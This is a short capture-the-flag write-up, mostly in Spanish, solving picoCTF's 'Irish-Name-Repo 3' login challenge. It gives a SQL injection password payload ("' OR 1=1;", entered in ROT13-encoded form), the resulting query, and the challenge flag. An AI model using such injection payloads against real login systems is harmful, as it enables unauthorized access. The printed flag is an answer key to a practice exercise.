# 3- Irish-Name-Repo 3

# Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!
# Solución
```
ingresas al mismo lugar que los anteriores retos, pero aqui solo aparece para introducir el password, cambia la misma linea del reto uno y dos al inspeccinar para proseguir con lo siguiente:

en la contraseña agregamos la siguiente inyeccion :

' OR 1=1;

te mostrara error pero te regresara:

' BE 1=1;

copialo regresa a la pagina del login y ingresalo en el password y listo reto terminado.

(Regresa lo siguiente al dar clic en login)

password: ' BE 1=1;
SQL query: SELECT * FROM admin where password = '' OR 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}
```
# Notas Adicionales

# Referencias